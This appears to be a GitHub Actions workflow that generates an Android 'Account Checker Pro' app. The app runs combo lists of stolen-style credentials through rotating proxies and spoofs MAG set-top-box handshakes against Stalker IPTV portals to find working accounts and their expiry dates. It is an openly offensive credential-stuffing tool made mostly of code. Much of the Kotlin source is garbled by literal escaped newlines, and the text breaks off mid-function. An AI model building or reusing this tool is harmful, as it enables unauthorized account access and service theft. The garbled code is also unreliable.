name: Build Account Checker APK

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: "17"
      - uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: "8.7"

      - name: Generate Account Checker Project
        run: |
          mkdir -p app/src/main/java/com/checker/stb \
                   app/src/main/res/values app/src/main/res/drawable \
                   app/src/main/assets

          cat > settings.gradle.kts <<'XEOF'
          pluginManagement {
              repositories { google(); mavenCentral(); gradlePluginPortal() }
          }
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
              repositories { google(); mavenCentral() }
          }
          rootProject.name = "AccountChecker"
          include(":app")
          XEOF

          cat > build.gradle.kts <<'XEOF'
          plugins {
              id("com.android.application") version "8.5.2" apply false
              id("org.jetbrains.kotlin.android") version "1.9.24" apply false
          }
          XEOF

          cat > gradle.properties <<'XEOF'
          org.gradle.jvmargs=-Xmx4096m -Dfile.encoding=UTF-8
          android.useAndroidX=true
          android.nonTransitiveRClass=true
          XEOF

          cat > app/build.gradle.kts <<'XEOF'
          plugins {
              id("com.android.application")
              id("org.jetbrains.kotlin.android")
          }
          android {
              namespace = "com.checker.stb"
              compileSdk = 34
              defaultConfig {
                  applicationId = "com.checker.stb"
                  minSdk = 24
                  targetSdk = 34
                  versionCode = 1
                  versionName = "1.0.0"
              }
              buildTypes { release { isMinifyEnabled = false } }
              compileOptions {
                  sourceCompatibility = JavaVersion.VERSION_17
                  targetCompatibility = JavaVersion.VERSION_17
              }
              kotlinOptions { jvmTarget = "17" }
              buildFeatures { compose = true }
              composeOptions { kotlinCompilerExtensionVersion = "1.5.14" }
          }
          dependencies {
              implementation("androidx.core:core-ktx:1.13.1")
              implementation("androidx.activity:activity-compose:1.9.0")
              implementation("androidx.lifecycle:lifecycle-runtime-ktx:2.8.0")
              implementation(platform("androidx.compose:compose-bom:2024.06.00"))
              implementation("androidx.compose.ui:ui")
              implementation("androidx.compose.ui:ui-graphics")
              implementation("androidx.compose.ui:ui-tooling-preview")
              implementation("androidx.compose.material3:material3")
              implementation("androidx.compose.material:material-icons-extended")
              implementation("com.squareup.okhttp3:okhttp:4.12.0")
              implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.8.1")
              implementation("com.google.code.gson:gson:2.10.1")
              implementation("androidx.documentfile:documentfile:1.0.1")
          }
          XEOF

          cat > app/src/main/AndroidManifest.xml <<'XEOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
              <application
                  android:allowBackup="true"
                  android:label="Account Checker Pro"
                  android:usesCleartextTraffic="true"
                  android:theme="@style/Theme.App">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
              </application>
          </manifest>
          XEOF

          cat > app/src/main/res/values/themes.xml <<'XEOF'
          <resources>
              <style name="Theme.App" parent="android:Theme.Material.NoActionBar">
                  <item name="android:windowBackground">#0A0E1E</item>
                  <item name="android:statusBarColor">#0A0E1E</item>
                  <item name="android:windowLightStatusBar">false</item>
              </style>
          </resources>
          XEOF

          cat > app/src/main/res/drawable/gradient_bg.xml <<'XEOF'
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android">
              <gradient android:angle="135" android:startColor="#0A0E1E"
                  android:centerColor="#0F1829" android:endColor="#0A0E1E" />
          </shape>
          XEOF

          cat > app/src/main/res/drawable/card_bg.xml <<'XEOF'
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android">
              <solid android:color="#131B2D"/>
              <corners android:radius="12dp"/>
              <stroke android:width="1dp" android:color="#1E2A3F"/>
          </shape>
          XEOF

          cat > app/src/main/res/drawable/button_bg.xml <<'XEOF'
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android">
              <solid android:color="#10B981"/>
              <corners android:radius="10dp"/>
          </shape>
          XEOF

          cat > app/src/main/res/drawable/success_bg.xml <<'XEOF'
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android">
              <solid android:color="#0D3A1A"/>
              <corners android:radius="8dp"/>
              <stroke android:width="1dp" android:color="#10B981"/>
          </shape>
          XEOF

          cat > app/src/main/res/drawable/fail_bg.xml <<'XEOF'
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android">
              <solid android:color="#3A0D0D"/>
              <corners android:radius="8dp"/>
              <stroke android:width="1dp" android:color="#EF4444"/>
          </shape>
          XEOF

          cat > app/src/main/java/com/checker/stb/ProxyConfig.kt <<'XEOF'
          package com.checker.stb

          import java.net.InetSocketAddress
          import java.net.Proxy

          data class ProxyEntry(
              val type: String,
              val host: String,
              val port: Int,
              val username: String = "",
              val password: String = ""
          )

          object ProxyManager {
              fun parseProxy(proxyStr: String): ProxyEntry? {\n                  val cleaned = proxyStr.trim()\n                  if (cleaned.isEmpty()) return null\n\n                  return try {\n                      val lower = cleaned.lowercase()\n                      val (scheme, body) = when {\n                          lower.startsWith(\"socks5://\") -> \"SOCKS5\" to cleaned.substringAfter(\"://\")\n                          lower.startsWith(\"socks4://\") -> \"SOCKS4\" to cleaned.substringAfter(\"://\")\n                          lower.startsWith(\"https://\") -> \"HTTPS\" to cleaned.substringAfter(\"://\")\n                          lower.startsWith(\"http://\") -> \"HTTP\" to cleaned.substringAfter(\"://\")\n                          else -> \"HTTP\" to cleaned\n                      }\n\n                      val hostPort = if (\"@\" in body) body.substringAfter(\"@\") else body\n                      val host = hostPort.substringBeforeLast(\":\")\n                      val port = hostPort.substringAfterLast(\":\").toIntOrNull() ?: 8080\n                      val user = if (\"@\" in body) body.substringBefore(\"@\").substringBefore(\":\") else \"\"\n                      val pass = if (\"@\" in body && \":\" in body.substringBefore(\"@\")) body.substringBefore(\"@\").substringAfter(\":\") else \"\"\n\n                      ProxyEntry(scheme, host, port, user, pass)\n                  } catch (_: Exception) {\n                      null\n                  }\n              }\n\n              fun toOkHttpProxy(entry: ProxyEntry): Proxy? {\n                  return try {\n                      when (entry.type) {\n                          \"HTTP\", \"HTTPS\" -> Proxy(Proxy.Type.HTTP, InetSocketAddress(entry.host, entry.port))\n                          \"SOCKS5\", \"SOCKS4\" -> Proxy(Proxy.Type.SOCKS, InetSocketAddress(entry.host, entry.port))\n                          else -> null\n                      }\n                  } catch (_: Exception) {\n                      null\n                  }\n              }\n          }\n          XEOF\n\n          cat > app/src/main/java/com/checker/stb/ConfigManager.kt <<'XEOF'\n          package com.checker.stb\n\n          import android.content.Context\n          import com.google.gson.Gson\n          import com.google.gson.GsonBuilder\n          import java.io.File\n          import java.text.SimpleDateFormat\n          import java.util.Date\n          import java.util.Locale\n\n          data class CheckerConfig(\n              val portal: String = \"\",\n              val credentials: List<Pair<String, String>> = emptyList(),\n              val proxies: List<String> = emptyList(),\n              val threads: Int = 4,\n              val timeout: Long = 15000,\n              val createdAt: String = SimpleDateFormat(\"yyyy-MM-dd HH:mm\", Locale.US).format(Date())\n          )\n\n          object ConfigManager {\n              private val gson: Gson = GsonBuilder().setPrettyPrinting().create()\n\n              fun save(context: Context, config: CheckerConfig, filename: String = \"checker_config.json\"): Boolean {\n                  return try {\n                      val file = File(context.filesDir, filename)\n                      file.writeText(gson.toJson(config))\n                      true\n                  } catch (e: Exception) {\n                      e.printStackTrace()\n                      false\n                  }\n              }\n\n              fun load(context: Context, filename: String = \"checker_config.json\"): CheckerConfig {\n                  return try {\n                      val file = File(context.filesDir, filename)\n                      if (file.exists()) gson.fromJson(file.readText(), CheckerConfig::class.java) else CheckerConfig()\n                  } catch (_: Exception) {\n                      CheckerConfig()\n                  }\n              }\n\n              fun listConfigs(context: Context): List<String> {\n                  return try {\n                      context.filesDir.listFiles()?.filter { it.name.endsWith(\".json\") }?.map { it.name } ?: emptyList()\n                  } catch (_: Exception) {\n                      emptyList()\n                  }\n              }\n\n              fun deleteConfig(context: Context, filename: String): Boolean {\n                  return try {\n                      File(context.filesDir, filename).delete()\n                  } catch (_: Exception) {\n                      false\n                  }\n              }\n\n              fun importCombo(comboStr: String): List<Pair<String, String>> {\n                  return comboStr.split(\"\\n\").mapNotNull { line ->\n                      val trimmed = line.trim()\n                      if (trimmed.isEmpty()) return@mapNotNull null\n                      val parts = trimmed.split(\":\", limit = 2)\n                      if (parts.size == 2) parts[0] to parts[1] else null\n                  }\n              }\n\n              fun importProxies(proxyStr: String): List<ProxyEntry> {\n                  return proxyStr.split(\"\\n\").mapNotNull { line ->\n                      val trimmed = line.trim()\n                      if (trimmed.isEmpty()) return@mapNotNull null\n                      ProxyManager.parseProxy(trimmed)\n                  }\n              }\n          }\n          XEOF\n\n          cat > app/src/main/java/com/checker/stb/StalkerRepository.kt <<'XEOF'\n          package com.checker.stb\n\n          import okhttp3.HttpUrl.Companion.toHttpUrl\n          import okhttp3.OkHttpClient\n          import okhttp3.Request\n          import org.json.JSONObject\n          import java.io.IOException\n          import java.util.concurrent.TimeUnit\n\n          data class Session(val portal: String, val token: String, val mac: String)\n\n          class StalkerRepository {\n              private val http = OkHttpClient.Builder()\n                  .connectTimeout(15, TimeUnit.SECONDS)\n                  .readTimeout(30, TimeUnit.SECONDS)\n                  .build()\n\n              private val ua = \"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3\"\n\n              fun normalizeMac(raw: String): String? {\n                  val v = raw.filter { it.isDigit() || it.uppercaseChar() in 'A'..'F' }.uppercase()\n                  return if (v.length == 12) v.chunked(2).joinToString(\":\") else null\n              }\n\n              private fun urls(portal: String): List<String> = portal.trim().trimEnd('/').let { c ->\n                  if (c.endsWith(\"/portal.php\")) listOf(c) else listOf(\n                      \"$c/c/portal.php\", \"$c/portal.php\", \"$c/server/load.php\"\n                  ).distinct()\n              }\n\n              fun call(url: String, params: Map<String, String>, s: Session? = null): JSONObject {\n                  val u = url.toHttpUrl().newBuilder().apply {\n                      params.forEach { (k, v) -> addQueryParameter(k, v) }\n                  }.build()\n\n                  val rb = Request.Builder().url(u)\n                      .header(\"User-Agent\", ua)\n                      .header(\"X-User-Agent\", \"Model: MAG254; Link: Ethernet\")\n                      .header(\"Accept\", \"*/*\")\n\n                  if (s != null) {\n                      rb.header(\"Authorization\", \"Bearer ${s.token}\")\n                      rb.header(\"Cookie\", \"mac=${s.mac}; stb_lang=en; timezone=UTC\")\n                  }\n\n                  http.newCall(rb.build()).execute().use { r ->\n                      val body = r.body?.string().orEmpty()\n                      if (!r.isSuccessful || body.isBlank()) throw IOException(\"HTTP ${r.code}\")\n                      return JSONObject(body)\n                  }\n              }\n\n              fun connect(portal: String, rawMac: String): Session {\n                  val mac = normalizeMac(rawMac) ?: throw IllegalArgumentException(\"Invalid MAC format\")\n                  var last: Exception = IOException(\"handshake failed\")\n                  for (u in urls(portal)) {\n                      try {\n                          val js = call(u, mapOf(\n                              \"type\" to \"stb\", \"action\" to \"handshake\", \"token\" to \"\",\n                              \"JsHttpRequest\" to \"1-xml\", \"mac\" to mac\n                          )).optJSONObject(\"js\")\n                          val tok = js?.optString(\"token\").orEmpty().substringBefore(\"~\").trim()\n                          if (tok.isNotEmpty()) return Session(u, tok, mac)\n                      } catch (e: Exception) { last = e }\n                  }\n                  throw last\n              }\n\n              fun expiry(s: Session): String {\n                  val keys = arrayOf(\"phone\", \"expire_date\", \"expire\", \"end_date\", \"end_time\", \"expired\", \"valid_to\")\n                  val profile = try {\n                      call(s.portal, mapOf(\"type\" to \"stb\", \"action\" to \"get_profile\", \"JsHttpRequest\" to \"1-xml\"), s).optJSONObject(\"js\") ?: JSONObject()\n                  } catch (_: Exception) { JSONObject() }\n\n                  val sources = mutableListOf(profile)\n                  for (p in listOf(\n                      mapOf(\"type\" to \"account_info\", \"action\" to \"get_account_info\"),\n                      mapOf(\"type\" to \"stb\", \"action\" to \"get_profile\")\n                  )) {\n                      try {\n                          call(s.portal, p + mapOf(\"JsHttpRequest\" to \"1-xml\", \"mac\" to s.mac), s).optJSONObject(\"js\")?.let { sources.add(it) }\n                      } catch (_: Exception) {}\n                  }\n\n                  for (js in sources) {\n                      for (obj in listOfNotNull(js, js.optJSONObject(\"account\"))) {\n                          for (k in keys) {\n                              val v = obj.optString(k).trim()\n                              if (v.isEmpty() || v == \"0\" || v == \"null\" || v.startsWith(\"0000\")) continue\n                              if (v.matches(Regex(\"\\\\d{9,13}\"))) {\n                                  var ts = v.toLong()\n                                  if (ts > 1000000000000L) ts /= 1000\n                                  if (ts < 1000000000L) continue\n                                  return \"expires\"\n                              }\n                              if (v.length >= 10) return v.substring(0, 10)\n                          }\n                      }\n                  }\n                  return \"unlimited\"\n              }\n          }\n          XEOF\n\n          cat > app/src/main/java/com/checker/stb/AccountChecker.kt <<'XEOF'\n          package com.checker.stb\n\n          import okhttp3.OkHttpClient\n          import java.util.concurrent.ConcurrentLinkedQueue\n          import java.util.concurrent.CountDownLatch\n          import java.util.concurrent.TimeUnit\n          import java.util.concurrent.atomic.AtomicInteger\n\n          data class CheckResult(\n              val portal: String,\n              val email: String,\n              val password: String,\n              val mac: String = \"\",\n              val success: Boolean,\n              val token: String = \"\",\n              val expiry: String = \"\",\n              val message: String = \"\",\n              val proxy: String = \"\",\n              val duration: Long = 0\n          )\n\n          object AccountChecker {\n              fun check(\n                  repo: StalkerRepository,\n                  portal: String,\n                  credentials: List<Pair<String, String>>,\n                  proxies: List<ProxyEntry> = emptyList(),\n                  threads: Int = 4,\n                  timeout: Long = 15000,\n                  onResult: (CheckResult) -> Unit,\n                  onProgress: (Int, Int) -> Unit\n              ) {\n                  if (credentials.isEmpty()) return\n\n                  val queue = ConcurrentLinkedQueue<Pair<String, String>>()\n                  queue.addAll(credentials)\n                  val totalCreds = credentials.size\n                  val checked = AtomicInteger(0)\n                  val latch = CountDownLatch(threads)\n\n                  repeat(threads) { threadId ->\n                      Thread {\n                          val proxyList = proxies.mapNotNull { ProxyManager.toOkHttpProxy(it) }\n                          val safeProxies = if (proxyList.isNotEmpty()) proxyList else listOf(null)\n                          var proxyIndex = threadId % safeProxies.size\n\n                          while (true)
